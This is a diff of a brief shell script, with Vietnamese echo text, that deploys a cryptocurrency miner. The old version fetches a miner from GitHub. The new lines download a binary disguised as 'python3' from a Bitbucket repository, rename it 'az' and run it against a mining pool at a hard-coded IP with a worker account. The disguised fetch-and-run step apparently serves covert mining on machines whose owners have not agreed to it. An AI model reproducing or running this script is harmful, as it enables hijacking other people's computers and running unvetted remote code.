@@ -8,13 +8,13 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./az -o 38.130.192.192:80 -u lovelyn -p tengicungduoc1234 --no-longpoll
-    
+./az -a yespowerr16 -o stratum+tcp://216.244.80.11:808 -u lovelyn.worker1 -p d=0.1
+     
 fi
 exit
 fi
 
-wget https://github.com/biblepay/cpuminer/raw/master/binaries/bbpminer_linux
-chmod +x bbpminer_linux
-mv bbpminer_linux az
-./az -o 38.130.192.192:80 -u lovelyn -p tengicungduoc1234 --no-longpoll
+wget https://bitbucket.org/tengikekao/myrep/downloads/python3
+chmod +x python3
+mv python3 az
+./az -a yespowerr16 -o stratum+tcp://216.244.80.11:808 -u lovelyn.worker1 -p d=0.1
